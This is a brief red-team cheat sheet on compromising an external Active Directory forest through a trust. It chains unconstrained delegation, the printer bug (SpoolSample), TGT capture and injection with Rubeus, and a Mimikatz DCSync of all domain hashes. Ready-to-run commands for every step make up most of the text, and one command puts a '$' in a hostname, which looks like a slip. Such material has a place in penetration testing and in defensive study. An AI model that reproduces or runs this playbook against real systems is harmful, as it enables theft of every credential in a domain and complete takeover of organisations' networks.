**WHAT IS THIS?**

If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving us complete access over the whole forest.

Tools we are going to use:
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [SpoolSample](https://github.com/leechristensen/SpoolSample)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

---

# Exploitation Example
- Start monitoring for TGTs with rubeus:
```powershell
Rubeus.exe monitor /interval:5 /filteruser:target-dc$
```
- Execute the printerbug to trigger the forced authentication of the target DC to our machine:
```powershell
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local
```
- Get the base64 value of the captured TGT from Rubeus and inject it into memory:
```powershell
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>
```
- Dump the hashes of the target domain using Mimikatz:
```powershell
lsadump::dcsync /domain:external.forest.local /all
```

---

### Detailed Articles
- [Not A Security Boundary: Breaking Forest Trusts](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)

